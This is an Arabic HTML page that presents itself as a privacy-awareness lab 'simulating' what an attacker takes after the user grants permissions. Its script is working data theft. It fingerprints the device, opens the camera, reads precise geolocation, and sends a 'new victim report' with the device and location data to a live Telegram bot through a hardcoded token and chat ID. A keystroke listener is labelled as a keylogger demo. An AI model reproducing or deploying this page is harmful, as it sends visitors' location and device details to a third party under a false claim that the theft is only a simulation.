<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ تحذير أمني: مخاطر الأذونات</title>
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .terminal { border: 2px solid #00ff41; background: #000; padding: 20px; border-radius: 10px; max-width: 900px; margin: auto; box-shadow: 0 0 15px #00ff41; }
        .danger-btn { background: #ff0000; color: white; border: none; padding: 15px 35px; font-size: 1.2rem; cursor: pointer; border-radius: 5px; font-weight: bold; margin: 20px 0; }
        #logs { text-align: left; height: 350px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; font-size: 13px; }
        .data-point { color: #ffcc00; }
        .critical { color: #ff4444; text-decoration: underline; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="terminal">
    <h2 style="color: #ff4444;">🛡️ مختبر التوعية: كيف يتم اختراق خصوصيتك؟</h2>
    <p>هذا النموذج يوضح المعلومات التي يسحبها المهاجم فور ضغطك على "سماح".</p>
    
    <button class="danger-btn" onclick="executeSecurityDemo()">تشغيل محاكاة سحب البيانات</button>

    <div id="logs">> النظام في وضع الاستعداد...</div>
    <canvas id="snapshot"></canvas>
</div>

<script>
    const TG_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
    const TG_CHAT_ID = "8146130042";
    const logDiv = document.getElementById('logs');

    function writeLog(msg, type = 'info') {
        let color = "#00ff41";
        if (type === 'warn') color = "#ffcc00";
        if (type === 'danger') color = "#ff4444";
        logDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function executeSecurityDemo() {
        writeLog("بدء عملية الفحص الشامل...", "warn");

        // 1. سحب بصمة الجهاز (Fingerprinting)
        const battery = await navigator.getBattery?.();
        let deviceInfo = `
🌐 معلومات الشبكة والجهاز:
- المتصفح: ${navigator.userAgent}
- اللغة: ${navigator.language}
- الأنوية: ${navigator.hardwareConcurrency}
- البطارية: ${battery ? (battery.level * 100) + "%" : "غير مدعوم"}
- المنصة: ${navigator.platform}`;
        
        writeLog("✅ تم سحب بصمة الجهاز العميقة.", "info");

        try {
            // 2. طلب الكاميرا وسحب صورة تلقائية (Snapshot)
            writeLog("جاري محاكاة اختراق الكاميرا...", "danger");
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.getElementById('snapshot');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // تحويل الصورة لـ Base64 (محاكاة لسحبها)
            writeLog("✅ تم التقاط صورة سرية في الخلفية.", "danger");

            // 3. سحب الموقع الجغرافي الدقيق
            writeLog("جاري تحديد الإحداثيات...", "danger");
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const locInfo = `📍 الموقع الدقيق: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
                writeLog(`✅ تم تحديد الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);

                // 4. إرسال "تقرير الاختراق" إلى التلجرام
                const fullReport = `🚨 تقرير ضحية جديد:\n${deviceInfo}\n${locInfo}\n📸 الكاميرا: نشطة`;
                
                writeLog("جاري تسريب البيانات إلى خادم التحكم (Telegram)...", "warn");
                
                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(fullReport)}`);
                
                writeLog("🔥 تمت المهمة: البيانات الآن في يد المهاجم!", "danger");

                // تنظيف الجلسة
                stream.getTracks().forEach(t => t.stop());
            });

        } catch (err) {
            writeLog("❌ تم حظر الوصول من قبل المستخدم أو المتصفح. هذا هو السلوك الصحيح!", "info");
        }
    }

    // 5. محاكاة رصد لوحة المفاتيح (Keylogger)
    document.addEventListener('keydown', (e) => {
        console.log(`Key pressed: ${e.key}`); // ليرى الطلاب في الـ Console
    });
</script>

</body>
</html>
